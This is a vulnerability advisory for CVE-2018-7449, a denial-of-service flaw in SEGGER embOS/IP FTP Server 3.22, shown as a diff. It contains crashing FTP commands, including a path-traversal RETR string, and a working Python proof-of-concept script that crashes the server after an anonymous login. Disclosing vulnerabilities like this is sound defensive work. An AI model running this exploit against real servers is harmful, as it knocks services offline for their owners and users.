@@ -1,0 +1,105 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/SEGGER-embOS-FTP-SERVER-v3.22-FTP-COMMANDS-DENIAL-OF-SERVICE.txt
+[+] ISR: Apparition Security          
+ 
+
+
+Vendor:
+=============
+www.segger.com
+
+
+Product:
+===========
+embOS/IP FTP Server v3.22
+
+
+Vulnerability Type:
+===================
+FTP Commands Denial Of Service
+
+
+
+CVE Reference:
+==============
+CVE-2018-7449
+
+
+Security Issue:
+================
+SEGGER embOS/IP FTP Server 3.22 allows remote attackers to cause a denial of service (daemon crash)
+via an invalid LIST, STOR, or RETR command.
+
+STOR 666\r\n
+LIST\r\n
+RETR '+'..\\'*8+'Windows\system.ini\r\n
+
+
+TELNET x.x.x.x 21
+
+220 Welcome to embOS/IP FTP server
+USER anonymous
+331 Password required.
+PASS anonymous
+230 User logged in, proceed.
+STOR Bye!
+
+CRASH!!!
+
+
+
+Exploit/POC:
+=============
+import socket,time
+
+VICTIM=raw_input('[+]Segger v3.22 FTP Server IP > ')
+USR='anonymous'
+PWD='anonymous'
+CMD="STOR Bye!\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((VICTIM, 21)) 
+print s.recv(1024) # Recieve FTP Banner
+time.sleep(1)
+s.send("USER " + USR+ "\r\n") 
+print s.recv(1024) 
+time.sleep(1)
+s.send("PASS "+ PWD+"\r\n") #
+print s.recv(1024) 
+time.sleep(1)
+s.send(CMD)
+print 'Sent %s' % CMD
+s.close() 
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification:  February 17, 2018
+Vendor acknowledgement: February 19, 2018
+Vendor released fixed version v3.22a : February 23, 2018
+March 1, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
